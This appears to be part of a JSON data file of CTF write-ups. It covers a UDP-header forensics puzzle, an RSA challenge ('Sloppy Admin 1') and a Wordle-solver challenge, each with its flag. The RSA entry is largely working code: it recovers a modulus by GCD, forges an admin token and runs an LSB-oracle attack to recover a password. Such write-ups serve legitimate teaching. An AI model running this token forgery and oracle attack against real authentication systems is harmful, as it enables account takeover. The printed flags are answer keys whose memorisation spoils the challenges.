      "content": "Map the packet layout:\n- Bytes 0-3: Sequence ID (4 hex digits)\n- Bytes 4-5: Header length in hex\n- Bytes 6 onwards: Header text (3 digits per character) followed by payload data\n\nIdentify that header length indicates how many characters to decode before the binary payload starts."
    },
    {
      "title": "Extract Header Information",
      "content": "Create a solver script that iterates through all UDP packets, extracts the header length field, and decodes the header text by converting each 3-digit decimal group to its ASCII equivalent.",
      "code": "import binascii\n\nprint(\"[*] Analyzing Packet Headers...\")\n\nwith open(\"all_udp_data.txt\", \"r\") as f:\n    lines = f.readlines()\n\nseen = set()\n\nfor line in lines:\n    line = line.strip()\n    if len(line) < 10: \n        continue\n    \n    try:\n        # Extract header length (hex) at position 4-5\n        len_hex = line[4:6]\n        header_len = int(len_hex, 16)\n        \n        # Calculate header end (each character = 3 digits)\n        header_end = 6 + (header_len * 3)\n        header_hex = line[6:header_end]\n        header_text = \"\"\n        \n        # Decode header text (3 digits -> ASCII)\n        for i in range(0, len(header_hex), 3):\n            val = int(header_hex[i:i+3])\n            header_text += chr(val)\n        \n        # Filter and display unique headers (excluding Ack)\n        if \"Ack\" not in header_text and header_text not in seen:\n            print(f\"[FOUND] Header Text: {header_text}\")\n            seen.add(header_text)\n    \n    except:\n        continue"
    },
    {
      "title": "Flag Discovery",
      "content": "Execute the solver script against all captured UDP packets. The script reveals a conversational exchange embedded in packet headers. The flag is hidden within a personal message in packet headers 2-3, not in the payload data (which contains a mixtape/media file).",
      "code": "# Sample script output:\n# [FOUND] Header Text: Begin Transmission: 1\n# [FOUND] Header Text: Dear VuwCTF engineer. I hope you are enjoying the mixtape...\n# [FOUND] Header Text: Did you appreciate the inscription? I wrote it just for you! \n#                      It said your name, and it said VuwCTF{d0_y0u_wan7_t0,,,l15t3n_t0_it?}\n# [FOUND] Header Text: Complete Transmission"
    }
  ],
  "flag": "VuwCTF{d0_y0u_wan7_t0,,,l15t3n_t0_it?}",
  "lessonsLearned": "Network forensics requires examining all packet fields, not just payload data. Custom protocols can hide information in headers, metadata, or other structural elements. Flag encoding doesn't always involve cryptography - simple character encoding (3-digit decimal) can effectively obscure data from quick examination. Covert channels in network traffic are real security concerns - information can be hidden in sequence numbers, timing, packet order, or header fields. When analyzing unknown protocols, fuzzing field positions and checking for ASCII patterns is an effective reverse engineering technique. Don't assume the main file transfer is the goal - metadata and headers often contain the real secrets."

},
{
  "id": "7",
  "title": "Sloppy Admin 1",
  "category": "Crypto",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "m0lecon CTF",
  "description": "RSA cryptography challenge involving LSB Oracle Attack, public key recovery via GCD, and token forgery. Exploit multiple vulnerabilities in a custom authentication system to steal the CEO's password.",
  "problemDescription": "A custom RSA authentication system (1024-bit, e=65537) that verifies tokens through an LSB Oracle function. The system allows users to register, receive encrypted tokens, and authenticate. Goal: obtain the CEO's plaintext password and login to retrieve the flag.",
  "tools": [
    "pwntools",
    "pycryptodome",
    "Python 3",
    "RSA Cryptanalysis",
    "Oracle Attack"
  ],
  "analysis": "The authentication system exhibits three critical cryptographic vulnerabilities:\n\n1. **LSB Oracle Vulnerability**: Token verification function reveals plaintext parity through different server responses\n   - Even plaintext (LSB=0): 'got lucky this time!'\n   - Odd plaintext (LSB=1): 'Authentication failed!'\n   - This enables Bleichenbacher's LSB Oracle Attack\n\n2. **Public Key Recovery via GCD**: Server does not provide the modulus N. However, by registering with known passwords and obtaining ciphertexts, attackers can recover N using GCD of differences:\n   - m^e ≡ c (mod N) implies m^e - c = k·N\n   - N = GCD(m₁^e - c₁, m₂^e - c₂, m₃^e - c₃)\n\n3. **Default Credentials**: Admin password is set to 'adminpassword' (recoverable via token forgery), allowing attackers to login and steal the CEO's encrypted token",
  "mathAnalysis": [
    {
      "title": "RSA Key Recovery",
      "formula": "N = \\text{GCD}(m_1^e - c_1, m_2^e - c_2, m_3^e - c_3)",
      "description": "Recover RSA modulus using GCD of multiple (plaintext, ciphertext) pairs",
      "variant": "highlight"
    },
    {
      "title": "LSB Oracle Binary Search",
      "formula": "\\text{plaintext} \\in [\\text{lower}, \\text{upper}] \\text{ refined by LSB feedback}",
      "description": "Iteratively halve the plaintext range based on LSB oracle responses",
      "variant": "default"
    },
    {
      "title": "Ciphertext Multiplication",
      "formula": "c_{next} = (c_{current} \\times (2^e \\bmod N)) \\bmod N",
      "description": "Multiply ciphertexts to test plaintext bits without decryption key",
      "variant": "default"
    }
  ],
  "solution": [
    {
      "title": "Vulnerability Discovery",
      "content": "Analyze the token verification mechanism. Identify that the random_bool_gen() function only checks the LSB (Least Significant Bit) of the decrypted plaintext, creating an oracle that leaks plaintext parity."
    },
    {
      "title": "Step 1: Public Key Recovery via GCD",
      "content": "Register three users with known passwords (pass_a, pass_b, pass_c) and obtain their encrypted tokens. Calculate N using GCD of differences between plaintext encryptions and obtained ciphertexts. This recovers the 1024-bit RSA modulus.",
      "code": "from Crypto.Util.number import bytes_to_long, long_to_bytes, GCD\n\n# Register three users and collect tokens\nusers = [(\"user_a\", \"pass_a\"), (\"user_b\", \"pass_b\"), (\"user_c\", \"pass_c\")]\ntokens, plaintexts = [], []\n\nfor username, password in users:\n    token = register(username, password)\n    tokens.append(int(token, 16))\n    plaintexts.append(bytes_to_long(password.encode()))\n\n# Recover modulus N\ne = 65537\nvals = [pow(m, e) - c for m, c in zip(plaintexts, tokens)]\nN = GCD(vals[0], GCD(vals[1], vals[2]))\n\nprint(f\"[+] Recovered N: {hex(N)}\")"
    },
    {
      "title": "Step 2: Admin Login & CEO Token Theft",
      "content": "Use the recovered modulus N to forge a valid token for 'adminpassword'. Login as admin to access the dashboard and retrieve the CEO's encrypted token for further analysis.",
      "code": "# Forge admin token\nadmin_token = pow(bytes_to_long(b\"adminpassword\"), e, N)\nadmin_token_hex = long_to_bytes(admin_token).hex()\n\n# Login as admin\nlogin(\"admin\", \"adminpassword\", admin_token_hex)\n\n# Steal CEO's encrypted token\nceo_token = get_ceo_token_from_dashboard()"
    },
    {
      "title": "Step 3: LSB Oracle Attack Setup",
      "content": "Prepare for binary search attack. Since the CEO password is only 32 bytes (256 bits) out of the 1024-bit modulus, optimize by skipping the first 664 bits. This reduces the oracle queries from 1024 to approximately 360 queries."
    },
    {
      "title": "Step 4: Optimized Binary Search with Pipelining",
      "content": "Implement binary search using LSB oracle responses. For each bit position:\n- Multiply ciphertext by 2^e (mod N) to shift bits\n- Send token to server and read LSB oracle response\n- Refine upper/lower bounds based on response\n\nUse request pipelining to send all inputs together, reducing network latency and staying within server timeout constraints.",
      "code": "# Binary search with skip optimization\nTOTAL_BITS, TARGET_BITS = 1024, 360\nSKIP_BITS = TOTAL_BITS - TARGET_BITS\n\nupper = Decimal(N) / (Decimal(2) ** SKIP_BITS)\nlower = Decimal(0)\n\ncurrent_c = (ceo_token * pow(pow(2, e, N), SKIP_BITS, N)) % N\nmultiplier = pow(2, e, N)\n\nfor i in range(SKIP_BITS, TOTAL_BITS):\n    current_c = (current_c * multiplier) % N\n    c_hex = long_to_bytes(current_c).hex()\n    \n    # Pipelined request\n    send_all_at_once([\"2\", \"CEO\", \"dummy\", c_hex])\n    \n    # Read LSB oracle response\n    response = get_response()\n    \n    # Refine bounds\n    diff = upper - lower\n    if \"lucky\" in response:  # LSB is 0 (even)\n        upper = lower + (diff / 2)\n    else:  # LSB is 1 (odd)\n        lower = lower + (diff / 2)\n\n# Extract password from final range\npassword = long_to_bytes(int(upper))"
    },
    {
      "title": "Step 5: Final Login & Flag Extraction",
      "content": "Use the recovered CEO password along with the stolen encrypted token to login as CEO. The server will display the flag as authentication completes.",
      "code": "# Login as CEO with recovered credentials\npassword_recovered = long_to_bytes(int(upper))\nlogin(\"CEO\", password_recovered, ceo_token_hex)\n\n# Flag displayed in welcome message\n# Output: \"Welcome CEO! Here is the flag: ptm{A1w4y5_m4k3_5ur3_t0_ch4ng3_y0ur_d3f4u1t_p4s5w0rd!}\""
    }
  ],
  "flag": "ptm{A1w4y5_m4k3_5ur3_t0_ch4ng3_y0ur_d3f4u1t_p4s5w0rd!}",
  "lessonsLearned": "RSA security depends on keeping the private key secret - even information leaks about plaintext properties (LSB, parity) enable devastating attacks. Never rely on a single piece of information for security; multi-factor design (oracle + key recovery) creates compound vulnerabilities. Default credentials must always be changed in production systems. Binary search via oracle is an efficient technique when exact decryption is impossible. Network optimization (pipelining, skipping unnecessary bits) is critical in time-constrained attacks. GCD-based key recovery shows that reusing RSA keys across different applications is dangerous - each ciphertext is a potential source of information about the modulus."

},
{
  "id": "8",
  "title": "Wordler Solver 1",
  "category": "Misc",
  "difficulty": "Medium",
  "points": 0,
  "date": "2025-02-24",
  "author": "CTF Team",
  "ctfName": "Lake CTF 2025",
  "description": "Multi-word Wordle variant with ANSI color-coded feedback. Develop an automated solver using dictionary-based word refinement and ANSI escape code parsing to solve within 6 guesses across multiple game sessions.",
  "problemDescription": "A server-based game combining Wordle mechanics with multiple words separated by underscores. Game structure (word lengths) changes per connection. Each guess receives color-coded feedback via ANSI escape codes (green=correct position, yellow=wrong position, grey=not in word). Maximum 6 guesses per session. Solver must parse variable-length word structures, extract color feedback, refine guesses iteratively, and retrieve the flag from successful solutions.",
  "tools": [
    "Python 3",
    "Regex",
    "Socket Programming",
    "ANSI Escape Code Parsing",
    "Dictionary-based Wordlist"
  ],
  "analysis": "The challenge presents several key technical requirements:\n\n1. **Variable Structure**: Each connection provides a different word-length pattern (e.g., [8, 8, 11] for three words)\n2. **ANSI Color Encoding**: Feedback uses escape sequences - \\x1b[92m for green, \\x1b[93m for yellow, \\x1b[90m for grey\n3. **Limited Attempts**: Only 6 guesses per session, but multiple sessions allowed until flag is obtained\n4. **Dictionary Dependency**: Required custom wordlist containing words of all necessary lengths (or use common word dictionary)\n5. **Stateless Guessing**: Each new connection resets the puzzle with different structure and target words",
  "solution": [
    {
      "title": "Parse Server Structure",
      "content": "Extract the puzzle structure from server banner. The structure uses block symbols (■) separated by underscores, where each block represents letter count. Parse this to determine how many words are needed and their respective lengths."
    },
    {
      "title": "Load Dictionary",
      "content": "Prepare a wordlist indexed by word length. For solving efficiency, group all words by their length in a dictionary/hashmap. This allows rapid lookup of valid words matching specific patterns."
    },
    {
      "title": "Initial Guess Selection",
      "content": "For first guess, select the first word from the wordlist for each required length. This provides baseline feedback without optimization. Common strategy: use high-frequency letters in consonant-vowel patterns."
    },
    {
      "title": "ANSI Escape Code Parsing",
      "content": "Parse server response to extract color codes for each letter. Use regex to identify ANSI sequences and map them to color states (Green, Yellow, Grey). Build a color mask per word block.",
      "code": "import re\n\ndef parse_colors(line, block_sizes):\n    color_map = []\n    tmp = ''\n    idx = 0\n    \n    # Pattern matches: \\x1b[9Xm(LETTER)\\x1b[0m where X is 2,3, or 0\n    pattern = r\"\\x1b\\[9([023])m([A-Z])\\x1b\\[0m\"\n    \n    for match in re.finditer(pattern, line):\n        code = match.group(1)\n        if code == '2':    # Green\n            tmp += 'G'\n        elif code == '3':  # Yellow\n            tmp += 'Y'\n        else:              # Grey\n            tmp += '-'\n        \n        if len(tmp) == block_sizes[idx]:\n            color_map.append(tmp)\n            tmp = ''\n            idx += 1\n    \n    return color_map"
    },
    {
      "title": "Iterative Word Refinement",
      "content": "For each color mask feedback, find the next candidate word that:\n- Matches all GREEN positions from previous guess\n- Has not been tried before (avoid repetition)\n- Exists in dictionary for that word length\n\nEach iteration tightens constraints until all letters turn green.",
      "code": "def refine_guess(previous_word, color_mask, used_words):\n    word_length = len(color_mask)\n    \n    for candidate in DICTIONARY[word_length]:\n        if candidate in used_words:\n            continue\n        \n        # Check if candidate matches all green positions\n        valid = True\n        for position, color in enumerate(color_mask):\n            if color == 'G':\n                if previous_word[position] != candidate[position]:\n                    valid = False\n                    break\n        \n        if valid:\n            used_words.add(candidate)\n            return candidate\n    \n    raise RuntimeError(f\"No valid word found for pattern {color_mask}\")"
    },
    {
      "title": "Main Solving Loop",
      "content": "Repeat for multiple game sessions until flag is received:\n1. Parse structure from server\n2. Generate initial guess using first words from each length group\n3. Send guess, receive colored response\n4. Parse colors and refine each word block\n5. Repeat up to 6 times per session\n6. Exit when flag (EPFL{...}) appears in server response",
      "code": "for session in range(300):  # Allow many sessions\n    sock = socket.create_connection((\"chall.polygl0ts.ch\", 6052))\n    \n    # Get structure\n    banner = sock.recv(1024).decode('utf-8')\n    structure = parse_structure(banner)\n    lengths = get_word_lengths(structure)\n    \n    # Initialize guess\n    guess = [DICTIONARY[length][0] for length in lengths]\n    used = set(guess)\n    \n    # Six attempts\n    for attempt in range(6):\n        guess_str = '_'.join(guess)\n        sock.sendall((guess_str + '\\n').encode())\n        \n        response = recv_until(sock, [b'Your guess:', b'EPFL{'])\n        \n        if b'EPFL{' in response:\n            print(\"[+] FLAG FOUND!\")\n            print(response.decode('utf-8'))\n            exit(0)\n        \n        # Parse feedback and refine\n        colors = parse_colors(response, lengths)\n        guess = [refine_guess(g, c, used) for g, c in zip(guess, colors)]\n    \n    sock.close()\n\nprint(\"[+] Puzzle solved after multiple sessions\")"
    }
  ],
  "flag": "EPFL{5CR1P71NG_15_CH34T1NG}",
  "lessonsLearned": "Wordle-variant challenges require robust parsing of variable input formats - always extract structure before processing. ANSI color codes are common in terminal-based CTF challenges; regex and character-by-character parsing are essential tools. Dictionary-based solving is effective for word games - preprocessing by length dramatically improves lookup speed. Multi-session challenges can be solved by automating the entire workflow within a loop. Stateless puzzles with limited attempts benefit from greedy/heuristic approaches; perfect optimization isn't always necessary. Terminal output parsing requires careful handling of escape sequences, line breaks, and timing - use robust buffer management (recv_until patterns). Consider word frequency and letter distribution for initial guess selection - starting with common words improves convergence in brute-force approaches."

}];